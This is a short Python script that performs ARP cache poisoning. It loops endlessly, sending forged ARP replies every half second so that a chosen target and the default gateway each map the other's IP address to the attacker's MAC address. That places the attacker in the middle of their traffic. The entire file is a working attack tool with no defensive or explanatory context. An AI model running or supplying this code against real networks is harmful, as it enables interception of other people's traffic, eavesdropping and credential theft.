import arp
import argparse
import time

parser = argparse.ArgumentParser()
parser.add_argument("--target-mac", help="Target's MAC address")
parser.add_argument("--target-ip", help="Target's IP address")
parser.add_argument("--default-gateway", help="Default gateway IP address")
parser.add_argument("--default-gateway-mac", help="Default gateway MAC address")
parser.add_argument("--interface", help="Network interface to use (default: wlan0)", default="wlan0")
args = parser.parse_args()

mac = arp.get_mac()
ip = arp.get_local_ip()

while True:
    arp.arp_reply(args.default_gateway, mac, args.target_ip, args.target_mac, interface=args.interface)
    arp.arp_reply(args.target_ip, mac, args.default_gateway, args.default_gateway_mac, interface=args.interface)
    time.sleep(0.5)